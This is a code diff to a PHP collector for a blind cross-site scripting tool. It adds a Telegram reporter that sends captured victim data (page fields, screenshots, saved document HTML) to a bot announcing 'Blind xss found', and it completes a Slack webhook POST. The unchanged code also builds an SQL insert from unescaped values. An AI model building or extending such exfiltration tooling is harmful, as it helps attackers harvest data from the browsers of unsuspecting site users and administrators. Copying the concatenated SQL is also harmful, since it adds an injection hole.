@@ -25,6 +25,11 @@ $_config = [
             'enabled' => false,
             'webhook_url' => 'https://hooks.slack.com/services/xxxxxxxx/yyyyyyyy/zzzzzzzzzzzzzzzzz',
         ],
+        'telegram' => [
+            'enabled' => false,
+            'bot' => '<bot_token>',
+            'id' => '<user_id>',
+        ],
     ],
 ];
 
@@ -69,7 +74,7 @@ class Reporting
 
         $db->query( "INSERT INTO bxss (id, created_at, datas) VALUES('".$t_datas['id']."', '".$t_datas['date']."', '".base64_encode(json_encode($t_datas))."')" );
     }
-    public static function report_slack( $config, $t_datas ) {
+    public static function report_slack( $config, $t_datas) {
         $log = '*'.str_repeat('-',10).' '.$t_datas['date'].' '.str_repeat('-',50)."*\n\n";
         if( isset($t_datas['screenshot']) ) {
             $screenshot = $t_datas['screenshot'];
@@ -105,6 +110,43 @@ class Reporting
         }
         $c = curl_init();
         curl_setopt( $c, CURLOPT_URL, $config['webhook_url'] );
+        curl_setopt( $c, CURLOPT_POST, true );
+        curl_setopt( $c, CURLOPT_HTTPHEADER, ['Content-type: application/json'] );
+        curl_setopt( $c, CURLOPT_POSTFIELDS, json_encode($t_json) );
+        curl_setopt( $c, CURLOPT_RETURNTRANSFER, true );
+        curl_exec( $c );
+    }
+    public static function report_telegram( $config, $t_datas) {
+        $log = "Howdy! Blind xss found\n";
+        $log .= "<b>".str_repeat('-',10).' '.$t_datas['date'].' '.str_repeat('-',50)."</b>\n\n";
+        if( isset($t_datas['screenshot']) ) {
+            $screenshot = $t_datas['screenshot'];
+            unset($t_datas['screenshot']);
+        }
+        if( isset($t_datas['document_html']) ) {
+            $document_html = $t_datas['document_html'];
+            unset( $t_datas['document_html'] );
+            $document_save = $t_datas['document_save'];
+            unset( $t_datas['document_save'] );
+        }
+        unset( $t_datas['id'] );
+        unset( $t_datas['date'] );
+        foreach( $t_datas as $k=>$v ) {
+            $log .= strtoupper( $k )."\n";
+            $log .= '<code>'.trim($v)."</code>\n\n";
+        }
+        if( isset($screenshot) ) {
+            $log .= "SCREENSHOT\n";
+            $log .= "<code>" . $screenshot . "</code>";
+        }
+        if( isset($document_html) ) {
+            $log .= "DOCUMENT\n";
+            $log .= "<code>" . $document_save . "</code>";
+        }
+        $t_json = [];
+        $t_json['text'] = $log;
+        $c = curl_init();
+        curl_setopt( $c, CURLOPT_URL, "https://api.telegram.org/bot" . $config['bot'] . "/sendMessage?chat_id=" . $config["id"] . "&parse_mode=HTML" );
         curl_setopt( $c, CURLOPT_POST, true );
         curl_setopt( $c, CURLOPT_HTTPHEADER, ['Content-type: application/json'] );
         curl_setopt( $c, CURLOPT_POSTFIELDS, json_encode($t_json) );
@@ -173,7 +215,7 @@ if( isset($_POST['datas']) )
     foreach( $_config['report'] as $method=>$config ) {
         $function = 'report_'.$method;
         if( method_exists('Reporting',$function) && isset($config['enabled']) && $config['enabled'] ) {
-            Reporting::$function( $config, $t_datas );
+            Reporting::$function( $config, $t_datas);
         }
     }
 
